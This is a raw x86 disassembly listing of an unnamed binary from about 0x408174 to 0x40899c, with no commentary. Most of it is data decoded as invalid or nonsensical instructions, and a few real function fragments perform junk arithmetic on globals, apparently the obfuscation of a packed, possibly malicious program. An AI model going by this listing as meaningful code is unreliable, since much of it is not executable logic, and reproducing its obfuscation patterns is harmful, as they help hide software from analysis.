  408174:	jp     0x408104
  408176:	cmp    al,BYTE PTR [esi-0x7]
  408179:	adc    BYTE PTR [eax+0xfed2a3a],al
  40817f:	mov    BYTE PTR [edx+ecx*8],dl
  408182:	lahf   
  408183:	hlt    
  408184:	add    al,0xb5
  408186:	add    eax,0x5ab423b4
  40818b:	das    
  40818c:	stos   DWORD PTR es:[edi],eax
  40818d:	lods   eax,DWORD PTR ds:[esi]
  40818e:	cmc    
  40818f:	jecxz  0x40816b
  408191:	push   edx
  408192:	inc    eax
  408193:	jmp    0x22761942
  408198:	dec    edx
  408199:	cli    
  40819a:	lahf   
  40819b:	mov    esi,edi
  40819d:	pop    ss
  40819e:	in     al,0x40
  4081a0:	out    0x64,al
  4081a2:	in     eax,dx
  4081a3:	mov    eax,DWORD PTR [ebp-0x10]
  4081a6:	mov    edx,DWORD PTR [ebp+0x8]
  4081a9:	xor    eax,ecx
  4081ab:	jmp    0x40832c
  4081b0:	dec    edx
  4081b1:	sbb    ch,0x7
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0x748c5d71]
  4081bf:	adc    ecx,DWORD PTR [ebp-0x2d818125]
  4081c5:	jg     0x408245
  4081c7:	jle    0x4081ed
  4081c9:	outs   dx,DWORD PTR ds:[esi]
  4081ca:	jne    0x4081e9
  4081cc:	(bad)  
  4081cd:	xchg   ecx,eax
  4081ce:	inc    edi
  4081cf:	out    dx,eax
  4081d0:	lods   al,BYTE PTR ds:[esi]
  4081d1:	sbb    BYTE PTR [eax+0xc],ch
  4081d4:	fwait
  4081d5:	aas    
  4081d6:	les    edi,FWORD PTR [ebx]
  4081d8:	(bad)  
  4081da:	sbb    ebp,DWORD PTR [eax]
  4081dc:	mov    al,ds:0xf0f76a88
  4081e1:	cmp    DWORD PTR [edi-0x30],esi
  4081e4:	gs loop 0x4081d2
  4081e7:	test   edi,ebp
  4081e9:	test   al,0x39
  4081eb:	icebp  
  4081ec:	cmp    eax,0x60945b81
  4081f1:	shr    BYTE PTR [ebx+0x45],0xb1
  4081f5:	(bad)  
  4081f6:	div    eax
  4081f8:	loopne 0x408211
  4081fa:	out    dx,al
  4081fb:	sbb    DWORD PTR [eax-0x4f],edi
  4081fe:	mov    fs,ebx
  408200:	clc    
  408201:	aam    0xe
  408203:	mov    cl,0xf9
  408205:	sahf   
  408206:	xchg   DWORD PTR [ecx-0x22bbb865],ebx
  40820c:	mov    ds:0xec21f979,al
  408211:	pusha  
  408212:	dec    edx
  408213:	pop    ebx
  408214:	outs   dx,DWORD PTR ds:[esi]
  408215:	jns    0xc84d3e95
  40821b:	retf   
  40821c:	ror    BYTE PTR [esi],1
  40821e:	adc    BYTE PTR [ecx+0x51],bh
  408221:	xchg   ebp,eax
  408222:	sub    eax,0x9c1de31d
  408227:	mov    DWORD PTR [ecx],0x688de5c6
  40822d:	cld    
  40822e:	imul   edx,DWORD PTR [esi-0x71c223be],0xffffffec
  408235:	cmp    al,0x2b
  408237:	lea    edi,[ecx-0x55]
  40823a:	scas   eax,DWORD PTR es:[edi]
  40823b:	mov    ds:0xd7e8bc1f,eax
  408240:	push   ebp
  408241:	(bad)  
  408242:	dec    esp
  408243:	ins    DWORD PTR es:[edi],dx
  408244:	pop    ds
  408245:	outs   dx,BYTE PTR ds:[esi]
  408246:	outs   dx,DWORD PTR ds:[esi]
  408247:	mov    al,0x1b
  408249:	fwait
  40824a:	test   DWORD PTR [esi+esi*2],edx
  40824d:	jecxz  0x4082b5
  40824f:	in     eax,dx
  408250:	pop    edi
  408251:	xor    al,0x2d
  408253:	dec    ebp
  408254:	(bad)  
  408255:	shl    DWORD PTR [ebx+0x11],1
  408258:	stos   DWORD PTR es:[edi],eax
  408259:	push   edx
  40825a:	xchg   ebp,eax
  40825b:	push   0x7628de73
  408260:	lds    esi,FWORD PTR [edx+eiz*1-0x4acfc0e0]
  408267:	stos   DWORD PTR es:[edi],eax
  408268:	xor    eax,0x8b2922f5
  40826d:	mov    al,ds:0xf939a3fc
  408272:	lea    ebx,[ebp+0x43]
  408275:	fwait
  408276:	jno    0x40822c
  408278:	fcmovnbe st,st(0)
  40827a:	adc    DWORD PTR [eax+0x20],esi
  40827d:	test   al,0x4c
  40827f:	cmp    BYTE PTR [esi-0x3d],ch
  408282:	sbb    edi,edx
  408284:	mov    edi,0x1da82dcc
  408289:	cs xchg edx,eax
  40828b:	sbb    DWORD PTR [ebx-0x53],eax
  40828e:	mov    dh,0x59
  408290:	mov    DWORD PTR [ecx-0xc],esp
  408293:	aad    0xea
  408295:	test   eax,0xf82e2874
  40829a:	xchg   ebp,eax
  40829b:	retf   
  40829c:	ds test eax,0x58c4b6f9
  4082a2:	and    BYTE PTR es:[edi-0x7e],0xed
  4082a7:	inc    ecx
  4082a8:	pop    edi
  4082a9:	out    dx,al
  4082aa:	arpl   WORD PTR [edx-0x5dcd21e8],sp
  4082b0:	fisttp QWORD PTR [edx+edi*2+0x74c24e73]
  4082b7:	dec    edx
  4082b8:	jmp    0x91c68be2
  4082bd:	pushf  
  4082be:	xor    eax,0x9b01fa6b
  4082c3:	adc    eax,0x4e59e89
  4082c8:	mov    edi,0xf468d80f
  4082cd:	and    dl,BYTE PTR [ecx]
  4082cf:	dec    ecx
  4082d0:	arpl   bp,bp
  4082d2:	test   al,0xfe
  4082d4:	shl    DWORD PTR [edx],0x47
  4082d7:	and    BYTE PTR [esi],bh
  4082d9:	es out 0x70,eax
  4082dc:	mov    bh,0x85
  4082de:	push   ebx
  4082df:	shl    BYTE PTR [edx+eax*1],0xce
  4082e3:	lods   al,BYTE PTR ds:[esi]
  4082e4:	xchg   bh,bh
  4082e6:	mov    ebx,0xaa804b3e
  4082eb:	or     bh,BYTE PTR [esi+0x8]
  4082ee:	add    BYTE PTR [edx*2+0x3f45e33f],bl
  4082f5:	fs iret 
  4082f7:	scas   al,BYTE PTR es:[edi]
  4082f8:	(bad)  
  4082f9:	jns    0x408352
  4082fb:	fiadd  DWORD PTR [esp-0x3a0cee4f]
  408302:	xor    al,BYTE PTR [ebx]
  408304:	outs   dx,DWORD PTR ds:[esi]
  408305:	inc    ebp
  408306:	retf   0x6b1e
  408309:	pop    edi
  40830a:	jl     0x408372
  40830c:	dec    edi
  40830d:	out    dx,eax
  40830e:	lds    esi,FWORD PTR [esi+0x4c]
  408311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408312:	mov    ah,0xc0
  408314:	push   ecx
  408315:	xchg   edi,eax
  408316:	mov    esi,DWORD PTR [esi+0x793a18c7]
  40831c:	add    DWORD PTR [edx-0x229008f],edi
  408322:	inc    eax
  408323:	add    ecx,ecx
  408325:	dec    eax
  408326:	punpckhwd mm5,QWORD PTR [ebx+0x7d]
  40832a:	(bad)  
  40832b:	jecxz  0x4082ba
  40832d:	test   BYTE PTR [eax],dl
  40832f:	popf   
  408330:	jb     0x408364
  408332:	add    BYTE PTR [ecx+0x45ff0845],cl
  408338:	or     al,0xe9
  40833a:	adc    al,0xfb
  40833c:	(bad)  
  40833d:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e872
  408366:	adc    DWORD PTR ds:0x42e862,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430642,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e86e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e86e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4305a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43058a
  4083aa:	or     DWORD PTR ds:0x42ef0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ef10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43058e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e866,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43059a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e876,0x42e86e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e86e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43058e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43058e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43058e,esi
  408424:	cmp    DWORD PTR ds:0x43058e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42eb08
  40844d:	cmp    DWORD PTR ds:0x43058e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	pushf  
  40847e:	mov    BYTE PTR [ebp-0x14],cl
  408481:	popa   
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x408461
  40848a:	mov    al,0x18
  40848c:	sbb    edx,DWORD PTR [eax-0x79]
  40848f:	dec    eax
  408490:	add    edi,DWORD PTR [esi-0x45]
  408493:	fcmove st,st(3)
  408495:	bound  ebx,QWORD PTR [ecx-0x37]
  408498:	mov    DWORD PTR [ebx],ecx
  40849a:	cwde   
  40849b:	pop    ebx
  40849c:	mov    dh,0xa
  40849e:	xor    eax,0xcc19b2c2
  4084a3:	jnp    0x4084e9
  4084a5:	cs sub eax,0x7aefecd1
  4084ab:	cmp    esi,edx
  4084ad:	in     al,dx
  4084ae:	call   0x6aef:0xc5c13aa1
  4084b5:	in     al,dx
  4084b6:	jb     0x40851e
  4084b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084b9:	(bad)  
  4084ba:	icebp  
  4084bb:	xor    bl,BYTE PTR [ecx+0x68313f7b]
  4084c1:	pop    ecx
  4084c2:	out    dx,al
  4084c3:	pop    esi
  4084c4:	dec    edx
  4084c5:	rcl    bh,0xc
  4084c8:	shl    BYTE PTR [eax],1
  4084ca:	jne    0x408469
  4084cc:	sar    BYTE PTR [esi+0x0],1
  4084cf:	ret    
  4084d0:	inc    ebp
  4084d1:	shl    dh,0x30
  4084d4:	jns    0x408459
  4084d6:	loop   0x408554
  4084d8:	idiv   BYTE PTR [edi+ebp*4]
  4084db:	dec    esi
  4084dc:	cmp    eax,0x46c9ca0a
  4084e1:	data16 and al,0xf9
  4084e4:	popa   
  4084e5:	and    eax,DWORD PTR [ebx-0x2a313744]
  4084eb:	lock sub al,0x78
  4084ee:	mov    ebx,0x961617f9
  4084f3:	xlat   BYTE PTR ds:[ebx]
  4084f4:	inc    eax
  4084f5:	push   ds
  4084f6:	mov    gs,edx
  4084f8:	xchg   esi,eax
  4084f9:	push   ss
  4084fa:	xor    edi,DWORD PTR [edx+edi*8+0x10]
  4084fe:	shl    bl,cl
  408500:	dec    edx
  408501:	pop    eax
  408502:	mov    bh,0x1e
  408504:	mov    cl,0xf7
  408506:	pop    edx
  408507:	push   ecx
  408508:	mov    ecx,0xe9d3f3d
  40850d:	int    0xbc
  40850f:	das    
  408510:	xchg   BYTE PTR [ecx],bl
  408512:	pop    ecx
  408513:	and    DWORD PTR [esi-0x71412c94],ebp
  408519:	add    DWORD PTR [eax-0x1c],ebx
  40851c:	(bad)  
  40851d:	mov    bh,0x17
  40851f:	dec    ebx
  408520:	mov    al,ds:0x4e3acf7d
  408525:	pop    esi
  408526:	(bad)  
  408527:	outs   dx,DWORD PTR ss:[esi]
  408529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40852a:	fstp   DWORD PTR [edi-0x5f]
  40852d:	(bad)  
  40852e:	mov    ch,0x4e
  408530:	ret    0xb08e
  408533:	in     eax,dx
  408534:	sub    ebp,DWORD PTR [edx+0x74]
  408537:	add    al,0x7c
  408539:	mov    edx,0x187c6bcd
  40853e:	sub    BYTE PTR [eax+0x6d459416],al
  408544:	ins    DWORD PTR es:[edi],dx
  408545:	popa   
  408546:	bound  esi,QWORD PTR [eax-0x13]
  408549:	xchg   esi,eax
  40854a:	jb     0x40858e
  40854c:	jg     0x408581
  40854e:	sahf   
  40854f:	fild   QWORD PTR cs:[ebp+0x6e]
  408553:	dec    esp
  408554:	jb     0x4084f1
  408556:	sar    DWORD PTR ds:0x4813a71,0x20
  40855d:	cwde   
  40855e:	jb     0x4085be
  408560:	outs   dx,BYTE PTR cs:[esi]
  408562:	jb     0x4085ad
  408564:	mov    bh,0xb8
  408566:	call   0xb605:0xccc1509a
  40856d:	out    0xce,eax
  40856f:	aaa    
  408570:	iret   
  408571:	fidivr WORD PTR [edi-0x3a]
  408574:	inc    edx
  408575:	scas   al,BYTE PTR es:[edi]
  408576:	sub    esp,0xf7c39fd9
  40857c:	mov    esi,0xb02e419e
  408581:	cmp    BYTE PTR [esi],cl
  408583:	int    0x52
  408585:	dec    ebx
  408586:	icebp  
  408587:	rcr    DWORD PTR [edx],1
  408589:	pop    ecx
  40858a:	add    DWORD PTR [ecx],edi
  40858c:	fldcw  WORD PTR [ebx+0x1]
  40858f:	in     al,0x4a
  408591:	ret    0x74eb
  408594:	cwde   
  408595:	test   al,0x53
  408597:	fs dec ebx
  408599:	hlt    
  40859a:	jno    0x408547
  40859c:	mov    ecx,0x9c7f49d1
  4085a1:	lods   al,BYTE PTR ds:[esi]
  4085a2:	push   edi
  4085a3:	popf   
  4085a4:	dec    ebp
  4085a5:	mov    bl,0xc5
  4085a7:	into   
  4085a8:	mov    ch,0x75
  4085aa:	inc    eax
  4085ab:	(bad)  
  4085ac:	pop    edx
  4085ad:	and    eax,0xac508e58
  4085b2:	cld    
  4085b3:	popf   
  4085b4:	cs pop eax
  4085b6:	fsub   st,st(3)
  4085b8:	dec    ebp
  4085b9:	pop    eax
  4085ba:	rol    dh,0x73
  4085bd:	fidiv  DWORD PTR [ecx+0x25]
  4085c0:	cmp    ebx,ecx
  4085c2:	jmp    0x11a5:0x655c11b7
  4085c9:	mov    DWORD PTR [edx-0x71],ebx
  4085cc:	mov    cl,al
  4085ce:	inc    esi
  4085cf:	jle    0x408641
  4085d1:	ret    
  4085d2:	push   0x30
  4085d4:	pand   mm7,QWORD PTR [edi]
  4085d7:	cwde   
  4085d8:	cmp    DWORD PTR [esi-0x352b657b],esi
  4085de:	jns    0x4085fc
  4085e0:	mov    DWORD PTR [ebx+0x14c6d5a1],ebx
  4085e6:	pop    esp
  4085e7:	mov    dl,bl
  4085e9:	stos   DWORD PTR es:[edi],eax
  4085ea:	or     edi,ebx
  4085ec:	mov    esp,DWORD PTR ds:0x7eeab043
  4085f2:	loopne 0x408636
  4085f4:	sbb    bx,0x39ff
  4085f9:	or     DWORD PTR [esi],esp
  4085fb:	xor    al,0x2b
  4085fd:	data16 aas 
  4085ff:	imul   ecx,ebx,0x2a
  408602:	mov    esp,DWORD PTR fs:[edi]
  408605:	jmp    0x40866a
  408607:	jmp    0x41c911d5
  40860c:	and    DWORD PTR [ecx+0x2c],0x72
  408610:	sbb    BYTE PTR [eax],al
  408612:	sbb    dl,bh
  408614:	mov    eax,0x56070129
  408619:	enter  0x4a16,0xd8
  40861d:	add    DWORD PTR [ecx+0x77],eax
  408620:	lock pop esp
  408622:	inc    edi
  408623:	rcl    eax,cl
  408625:	xchg   BYTE PTR [ebx-0x1f17b6cb],al
  40862b:	(bad)
  40862e:	imul   eax,DWORD PTR [esi],0x4cd9ff40
  408634:	jecxz  0x4086b0
  408636:	retf   0x7691
  408639:	nop
  40863a:	call   0x894922f8
  40863f:	mov    cl,0x87
  408641:	idiv   DWORD PTR [ecx]
  408643:	rcl    BYTE PTR [ecx+0x513b41a5],cl
  408649:	and    esi,DWORD PTR [esi-0x595be260]
  40864f:	stc    
  408650:	add    edi,DWORD PTR [edx+eiz*1]
  408653:	sar    dh,1
  408655:	retf   
  408656:	outs   dx,BYTE PTR ds:[esi]
  408657:	and    BYTE PTR [ecx+eax*8],dl
  40865a:	add    DWORD PTR [ecx+0xa312992],eax
  408660:	retf   0x72a2
  408663:	push   ss
  408664:	test   BYTE PTR [ecx-0x32],al
  408667:	and    ebx,DWORD PTR [edi]
  408669:	gs into 
  40866b:	(bad)  
  40866c:	xor    al,0xd5
  40866e:	mov    edi,0xd82a8157
  408673:	shl    esi,1
  408675:	inc    edx
  408676:	xchg   esp,eax
  408677:	(bad)  
  408678:	dec    eax
  408679:	stos   BYTE PTR es:[edi],al
  40867a:	fadd   DWORD PTR [ebp+0x39]
  40867d:	jmp    0x4086ce
  40867f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408680:	pop    es
  408681:	add    bh,BYTE PTR [ecx+eiz*8-0x56b8ddea]
  408688:	leave  
  408689:	pop    ebx
  40868a:	push   esi
  40868b:	mov    eax,ds:0x18199e5d
  408690:	xchg   BYTE PTR [edi+0x51],dh
  408693:	imul   ebp,DWORD PTR [esi+0x26],0x480316e4
  40869a:	aaa    
  40869b:	ret    0xe838
  40869e:	jmp    0x88548797
  4086a3:	sub    al,0x5b
  4086a5:	in     eax,dx
  4086a6:	cli    
  4086a7:	mov    eax,0x4fc03c3c
  4086ac:	rol    BYTE PTR [edx],0xd6
  4086af:	int3   
  4086b0:	cmp    ecx,DWORD PTR [ecx]
  4086b2:	jp     0x40870c
  4086b4:	pushf  
  4086b5:	cmp    ebx,DWORD PTR [edi-0x3342e6fc]
  4086bb:	prefetcht1 BYTE PTR [ecx-0x1316ae53]
  4086c2:	and    eax,0xf1d7d206
  4086c7:	jb     0x408742
  4086c9:	in     eax,0x68
  4086cb:	mov    ds:0xa54c8e6d,eax
  4086d0:	lods   al,BYTE PTR ds:[esi]
  4086d1:	dec    ebx
  4086d2:	mov    al,ds:0x78f61e34
  4086d7:	scas   al,BYTE PTR es:[edi]
  4086d8:	sbb    eax,DWORD PTR [edi]
  4086da:	sti    
  4086db:	mov    al,0xa1
  4086dd:	mov    al,ds:0xb46694a2
  4086e2:	fidivr DWORD PTR [edx-0x49]
  4086e5:	bound  eax,QWORD PTR [esi-0x6]
  4086e8:	pop    ds
  4086e9:	lock lods eax,DWORD PTR ds:[esi]
  4086eb:	mov    DWORD PTR [eax-0x11],ecx
  4086ee:	mov    ss,WORD PTR [ebx]
  4086f0:	pushf  
  4086f1:	pop    esi
  4086f2:	or     DWORD PTR [eax+ebp*8+0x3e],edx
  4086f6:	fisttp DWORD PTR [esi-0x47085152]
  4086fc:	leave  
  4086fd:	fbld   TBYTE PTR [ecx]
  4086ff:	int    0xff
  408701:	push   edi
  408702:	mov    al,bh
  408704:	ins    BYTE PTR es:[edi],dx
  408705:	imul   eax,DWORD PTR [edx-0x10],0xa81b1e25
  40870c:	sub    ebp,DWORD PTR [edi]
  40870e:	xlat   BYTE PTR ds:[ebx]
  40870f:	jecxz  0x408744
  408711:	pop    ebp
  408712:	outs   dx,DWORD PTR ds:[esi]
  408713:	int    0xac
  408715:	sub    BYTE PTR [eax],bl
  408717:	fisub  WORD PTR [esi+0x29a7275f]
  40871d:	cli    
  40871e:	fsub   st,st(0)
  408720:	sub    bl,cl
  408722:	cli    
  408723:	lds    esp,FWORD PTR [eax-0x17c40b82]
  408729:	je     0x408716
  40872b:	jno    0x40878f
  40872d:	fld    DWORD PTR [edx+0x54]
  408730:	fwait
  408731:	test   al,0x3a
  408733:	imul   esp,DWORD PTR [ecx-0x164352b0],0xbf305fc4
  40873d:	mov    edi,DWORD PTR [ecx+0x766d6afe]
  408743:	add    DWORD PTR [ebx+0x74],esp
  408746:	or     BYTE PTR [ebx+0x77],al
  408749:	shl    DWORD PTR [ebp-0x62d013],cl
  40874f:	xor    dl,BYTE PTR [ebx]
  408751:	push   0x1e14137c
  408756:	inc    ebp
  408757:	mov    ds:0x28aaa8fa,eax
  40875c:	cmp    al,0x2b
  40875e:	xchg   DWORD PTR [ebx-0x2b],edi
  408761:	xchg   DWORD PTR [eax-0x1e],esi
  408764:	repz add BYTE PTR [ebp-0x3e981217],bl
  40876b:	xor    edx,edx
  40876d:	mov    ecx,0x7264fcad
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  edi,QWORD PTR [ebx+0x4a]
  40878c:	push   esi
  40878d:	add    eax,DWORD PTR [ebx-0x21]
  408790:	jle    0x408810
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x408804
  408797:	out    0x7d,eax
  408799:	mov    dl,0xc7
  40879b:	xchg   ebp,eax
  40879c:	loope  0x40878b
  40879e:	adc    eax,0x1c770b77
  4087a3:	mov    ds:0xa60f11fe,al
  4087a8:	scas   eax,DWORD PTR es:[edi]
  4087a9:	jne    0x40873b
  4087ab:	dec    ebp
  4087ac:	add    ch,BYTE PTR [edx+esi*1+0x4f5f6d3d]
  4087b3:	aaa    
  4087b4:	mov    al,0x13
  4087b6:	iret   
  4087b7:	mov    cl,0xb9
  4087b9:	in     eax,0xad
  4087bb:	jb     0x408760
  4087bd:	inc    esi
  4087be:	scas   eax,DWORD PTR es:[edi]
  4087bf:	rol    BYTE PTR [edx],0x8c
  4087c2:	add    bl,cl
  4087c4:	cmp    BYTE PTR [ebx+0x70ac5e02],dh
  4087ca:	icebp  
  4087cb:	and    BYTE PTR [edx-0x47],cl
  4087ce:	mov    eax,0xffe398e2
  4087d3:	cmp    DWORD PTR [edx+0x77],esp
  4087d6:	scas   al,BYTE PTR es:[edi]
  4087d7:	mov    ebx,0x25b180b5
  4087dc:	sbb    esi,ebp
  4087de:	(bad)  
  4087df:	shl    DWORD PTR [eax+0x784f1494],cl
  4087e5:	(bad)  
  4087e6:	hlt    
  4087e7:	jg     0x408829
  4087e9:	sub    ah,BYTE PTR ds:0xc0fc7826
  4087ef:	outs   dx,BYTE PTR ds:[esi]
  4087f0:	aam    0xb1
  4087f2:	call   0xf812:0x7e2ec13a
  4087f9:	mov    edi,0x4a8a568f
  4087fe:	pop    eax
  4087ff:	js     0x408878
  408801:	sub    eax,0x50b71010
  408806:	aas    
  408807:	jnp    0x40879d
  408809:	mov    al,BYTE PTR [edx]
  40880b:	dec    ebx
  40880c:	sahf   
  40880d:	jo     0x40880c
  40880f:	dec    esi
  408810:	pushf  
  408811:	into   
  408812:	rcr    ebp,cl
  408814:	adc    DWORD PTR [eax],esp
  408816:	push   cs
  408817:	out    0x78,eax
  408819:	pop    DWORD PTR [ebp+0xb3caff3]
  40881f:	mov    dh,0x0
  408821:	daa    
  408822:	setbe  BYTE PTR [esp+esi*4-0xec171f3]
  40882a:	pop    es
  40882b:	pop    ds
  40882c:	push   esp
  40882d:	fbstp  TBYTE PTR [ebx+0x6c37549]
  408833:	ret    0x7bd9
  408836:	dec    ebp
  408837:	sbb    al,0xe3
  408839:	mov    bl,0xf8
  40883b:	mov    ds:0xf43289eb,al
  408840:	dec    ebx
  408841:	fs mov edx,0xfcd07027
  408847:	jb     0x408808
  408849:	push   cs
  40884a:	inc    esp
  40884b:	jne    0x4088c3
  40884d:	dec    ebx
  40884e:	push   0xfb931a10
  408853:	mov    ah,0x88
  408855:	pop    esp
  408856:	scas   eax,DWORD PTR es:[edi]
  408857:	call   0x9810:0xc2a2fd7f
  40885e:	(bad)  
  40885f:	and    eax,0xc399c7ec
  408864:	(bad)  
  408866:	call   DWORD PTR [ebx+edx*2]
  408869:	push   ss
  40886a:	push   es
  40886b:	cmovnp ebp,DWORD PTR [ebx+eax*2]
  40886f:	adc    al,0xfc
  408871:	xchg   edx,eax
  408872:	rcr    DWORD PTR [ebp-0x4afd4f9e],1
  408878:	mov    WORD PTR [eax-0x53b9500c],fs
  40887e:	call   0x8b9a:0x1c966e3
  408885:	aam    0xd4
  408887:	xchg   ebx,eax
  408888:	cmc    
  408889:	test   eax,0x4aef4b5b
  40888e:	or     BYTE PTR [ebx-0x63efad99],dh
  408894:	jns    0x408910
  408896:	mov    ds:0x52fcdf43,al
  40889b:	or     bh,0xdb
  40889e:	mov    al,ds:0xc1316ef5
  4088a3:	jge    0x408856
  4088a5:	faddp  st(2),st
  4088a7:	inc    edx
  4088a8:	jbe    0x4088a3
  4088aa:	test   BYTE PTR [edx+edi*4],0x19
  4088ae:	sub    DWORD PTR [ebp-0x37832037],0xffffffe7
  4088b5:	xchg   DWORD PTR [ebx+0x6f],esp
  4088b8:	(bad)  
  4088b9:	popf   
  4088ba:	call   DWORD PTR [edi]
  4088bc:	and    DWORD PTR [ecx],0x6e54f415
  4088c2:	push   ecx
  4088c3:	jecxz  0x4088ba
  4088c5:	clc    
  4088c6:	bound  ecx,QWORD PTR [ecx+eax*1]
  4088c9:	shl    dl,0x31
  4088cc:	inc    edi
  4088cd:	xchg   edi,eax
  4088ce:	add    esp,edi
  4088d0:	xor    DWORD PTR [edx+0x6acc7262],0x71
  4088d7:	add    eax,0xbae8dcde
  4088dc:	shl    BYTE PTR [ebx+0x7e],0x98
  4088e0:	mov    bh,0x4f
  4088e2:	adc    ecx,DWORD PTR [ebx]
  4088e4:	hlt    
  4088e5:	or     eax,0x6be0268e
  4088ea:	xchg   esi,eax
  4088eb:	test   al,0xfb
  4088ed:	fcom   st(2)
  4088ef:	neg    DWORD PTR [ebp+0x3e]
  4088f2:	add    al,0xc5
  4088f4:	mov    dl,0xbb
  4088f6:	jns    0x408919
  4088f8:	xor    DWORD PTR [edi+0x6f],eax
  4088fb:	jb     0x40891a
  4088fd:	popf   
  4088fe:	outs   dx,DWORD PTR ds:[esi]
  4088ff:	lods   al,BYTE PTR ds:[esi]
  408900:	lahf   
  408901:	loope  0x408959
  408903:	retf   0x8806
  408906:	pusha  
  408907:	mov    esi,0x8b94b5cd
  40890c:	dec    ebx
  40890d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40890e:	pushf  
  40890f:	popa   
  408910:	loope  0x40892d
  408912:	test   BYTE PTR [ecx-0x41],ah
  408915:	in     al,dx
  408916:	push   ds
  408917:	ret    
  408918:	xlat   BYTE PTR ds:[ebx]
  408919:	add    eax,0x7493c2cd
  40891e:	sbb    BYTE PTR cs:[eax-0x6a],dh
  408922:	and    BYTE PTR [ecx],0x68
  408925:	int    0x2c
  408927:	jge    0x408987
  408929:	xchg   DWORD PTR [eax-0x3203680e],ebx
  40892f:	push   cs
  408930:	push   edx
  408931:	mov    ebp,0xba06ad10
  408936:	push   ecx
  408937:	mov    ch,0x9e
  408939:	fdiv   DWORD PTR [edi-0x14]
  40893c:	and    esp,DWORD PTR [ebp+eiz*4-0x7ee90147]
  408943:	push   esp
  408944:	or     ecx,0x3bfe9176
  40894a:	pop    ds
  40894b:	mov    al,0x8f
  40894d:	stc    
  40894e:	ret    0xc3b7
  408951:	push   edi
  408952:	outs   dx,BYTE PTR ds:[esi]
  408953:	lds    eax,FWORD PTR [edi-0x6cf72483]
  408959:	cmp    BYTE PTR [edi+0x64],dh
  40895c:	pushf  
  40895d:	repz int 0xb2
  408960:	xchg   edi,eax
  408961:	nop
  408962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408963:	enter  0xfb2a,0xb3
  408967:	mov    ecx,0xd5d8ac1e
  40896c:	mov    edi,0x384851f4
  408971:	ds inc edx
  408973:	xchg   edx,eax
  408974:	sbb    bh,0x40
  408977:	ins    DWORD PTR es:[edi],dx
  408978:	loopne 0x408952
  40897a:	sbb    al,0xc0
  40897c:	add    bl,BYTE PTR ds:0x7e1c2ecc
  408982:	or     eax,0x377a9bd1
  408987:	call   0x39d10076
  40898c:	ja     0x4089bc
  40898e:	adc    BYTE PTR [ebx],bl
  408990:	in     eax,0xd7
  408992:	popf   
  408993:	jbe    0x40895f
  408995:	push   ss
  408996:	test   eax,0x9119361
  40899b:	hlt    
  40899c:	xor    al,0x9c
